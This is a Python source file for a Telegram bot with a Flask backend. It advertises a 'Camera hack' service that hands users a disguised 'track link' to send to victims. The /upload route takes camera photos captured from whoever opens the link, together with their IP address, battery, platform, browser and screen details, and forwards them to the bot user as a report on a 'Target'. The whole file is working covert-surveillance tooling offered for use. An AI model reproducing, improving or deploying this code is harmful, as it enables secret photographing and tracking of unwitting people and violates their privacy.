import os, base64, threading, sqlite3, time
from flask import Flask, render_template, request, jsonify
import telebot
from telebot import types

app = Flask(__name__)

# --- CONFIGURATION ---
BOT_TOKEN = os.getenv('BOT_TOKEN')
MY_CHAT_ID = "7162565886"
ADMIN_ID = 7162565886
CHANNEL_USER = "@hackerscolonytech"
YT_LINK = "https://youtube.com/@hackers_colony_tech?si=ao7sXsZt8OLAj1Lc"

bot = telebot.TeleBot(BOT_TOKEN)

# --- DATABASE LOGIC ---
def init_db():
    conn = sqlite3.connect('users.db')
    conn.execute('CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY)')
    conn.commit()
    conn.close()

def add_user(user_id):
    try:
        conn = sqlite3.connect('users.db')
        conn.execute('INSERT OR IGNORE INTO users (user_id) VALUES (?)', (user_id,))
        conn.commit()
        conn.close()
    except: pass

def get_all_users():
    try:
        conn = sqlite3.connect('users.db')
        cursor = conn.execute('SELECT user_id FROM users')
        users = [row[0] for row in cursor.fetchall()]
        conn.close()
        return users
    except: return []

# --- HELPERS ---
def check_join(user_id):
    try:
        status = bot.get_chat_member(CHANNEL_USER, user_id).status
        return status in ['member', 'administrator', 'creator']
    except: return False

# --- TELEGRAM HANDLERS ---
@bot.message_handler(commands=['broadcast'])
def broadcast(message):
    if message.from_user.id == ADMIN_ID:
        msg_text = message.text.replace('/broadcast', '').strip()
        if not msg_text:
            bot.reply_to(message, "Usage: /broadcast [Your Message]")
            return
        users = get_all_users()
        count = 0
        for user in users:
            try:
                bot.send_message(user, msg_text)
                count += 1
                time.sleep(0.1)
            except: pass
        bot.send_message(ADMIN_ID, f"📢 Broadcast Sent to {count} users.")

@bot.message_handler(commands=['start'])
def start(message):
    add_user(message.chat.id)
    if not check_join(message.chat.id):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("Join Channel 📢", url=f"https://t.me/{CHANNEL_USER.replace('@','')}"))
        markup.add(types.InlineKeyboardButton("YouTube Link 📺", url=YT_LINK))
        markup.add(types.InlineKeyboardButton("Check Join ✅", callback_data="check_join"))
        bot.send_message(message.chat.id, "❌ You must join our channel and visit YouTube to use this bot!", reply_markup=markup)
        return

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Camera hack 📸", callback_data="cam_menu"))
    try:
        bot.send_message(message.chat.id, "Select service ✅\nClick on 'camera hack' your service is procced 👇👇", reply_markup=markup)
    except: pass

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    base_url = "https://happy-wishing-you.onrender.com" 
    user_id = call.message.chat.id
    
    if call.data == "check_join":
        if check_join(user_id):
            bot.delete_message(user_id, call.message.message_id)
            start(call.message)
        else:
            bot.answer_callback_query(call.id, "❌ Join the channel first!", show_alert=True)
        return

    try:
        if call.data == "cam_menu":
            markup = types.InlineKeyboardMarkup(row_width=2)
            btn_back = types.InlineKeyboardButton("📸Back camera 📸", callback_data="mode_back")
            btn_front = types.InlineKeyboardButton("📸 Front Camera 📸", callback_data="mode_front")
            btn_dual = types.InlineKeyboardButton("📸 Dual camera 📸", callback_data="mode_dual")
            markup.add(btn_front, btn_back, btn_dual)
            bot.edit_message_text("😃Select any service ✅", user_id, call.message.message_id, reply_markup=markup)
        
        elif call.data.startswith("mode_"):
            mode = call.data.split("_")[1]
            track_link = f"{base_url}?m={mode}&uid={user_id}"
            bot.send_message(user_id, f"😃 it's your track link 🔗👇👇\n\nUrl= {track_link}")
    except: pass

# --- FLASK ROUTES ---
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    data = request.json
    target_id = data.get('uid', MY_CHAT_ID)
    info = data.get('info', {})
    branding = "<b>━━━━━━━━━━━━━━━━━━━━━━\n✨ Created by Roshan Ali ✨\n━━━━━━━━━━━━━━━━━━━━━━</b>"
    report = (f"🛡️ <b>SYSTEM AUDIT: {data.get('label')}</b>\n"
              f"👤 <b>Target:</b> {data.get('name')}\n"
              f"🔋 <b>Battery:</b> {info.get('battery')}\n"
              f"🌐 <b>IP Address:</b> {request.remote_addr}\n"
              f"📱 <b>Platform:</b> {info.get('platform')}\n"
              f"🖥️ <b>Browser:</b> {info.get('browser')}\n"
              f"📐 <b>Resolution:</b> {info.get('screen')}\n\n{branding}")
    if data.get('image'):
        try:
            img_bytes = base64.b64decode(data.get('image').split(',')[1])
            bot.send_photo(target_id, img_bytes, caption=report, parse_mode='HTML')
        except: pass
    return jsonify({"status": "success"})

# --- MAIN RUNNER ---
if __name__ == "__main__":
    init_db()
    def run_bot():
        # Conflict Error (409) Fix: Wait before starting
        time.sleep(10) 
        while True:
            try:
                bot.remove_webhook()
                bot.polling(none_stop=True, interval=3, timeout=60)
            except:
                time.sleep(15)

    threading.Thread(target=run_bot, daemon=True).start()
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
    
